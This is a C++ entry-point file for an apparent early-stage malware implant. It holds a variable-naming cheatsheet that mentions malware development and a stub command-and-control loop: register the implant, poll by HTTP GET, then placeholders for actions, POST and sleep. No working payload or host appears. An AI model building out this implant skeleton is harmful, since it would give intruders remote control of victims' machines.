// Implant_v01.cpp : Defines the entry point for the application.
//

/*
 * ======================================================================================
 * C++ VARIABLE NAMING CHEATSHEET/Standard
 * ======================================================================================
 * * 1. LOCAL VARIABLES/Funcs
 * ------------------
 * Google/STL Style : snake_case        (e.g., buffer_size, retry_count)
 * * 2. CLASS MEMBER VARIABLES
 * -------------------------
 * Google Style     : snake_case_       (e.g., buffer_size_, is_connected_)
 * * 3. POINTERS & HANDLES (Common in WinAPI/Malware Dev)
 * ----------------------------------------------------
 * pVariable        : Pointer           (e.g., pBuffer, pContext)
 * ppVariable       : Pointer to Ptr    (e.g., ppOutput)
 * hVariable        : Handle            (e.g., hProcess, hFile)
 * szVariable       : String (Zero term)(e.g., szTargetIp)
 * lpVariable       : Long Pointer      (e.g., lpPayload)
 * * 4. GLOBALS & STATICS
 * --------------------
 * Global           : g_camelCase       (e.g., g_configManager)
 * Static Member    : s_camelCase       (e.g., s_instanceCount)
 * * 5. CONSTANTS & MACROS
 * ---------------------
 * Constants        : kPascalCase       (e.g., kMaxRetries)
 * Macros           : SCREAMING_SNAKE   (e.g., MAX_BUFFER_SIZE, ENABLE_DEBUG)
 * * ======================================================================================
 */

#include <iostream>

#include "Implant_v01.h"
#include "tests/test.h"
#include "lifecycle/register.h"
#include "lifecycle/comms.h"

int temp_loop() {
    //note - do a while not registered?
    register_implant(); // should return id or set it in settings, etc. 

    while (1) {
        //HTTP_GET
        //placeholder id
        get("019bbe19-2c0e-7ee1-a81a-78d7e1a97ac0");

        //ACTIONS

        //HTTP_POST

        //SLEEP
        return 0;

    }
}


int main()
{
    std::cout << "hello" << std::endl;

    //for debugging/sanity check, run all tests first. Remove for production use.
    test_all();

    temp_loop();

    return 0;
}
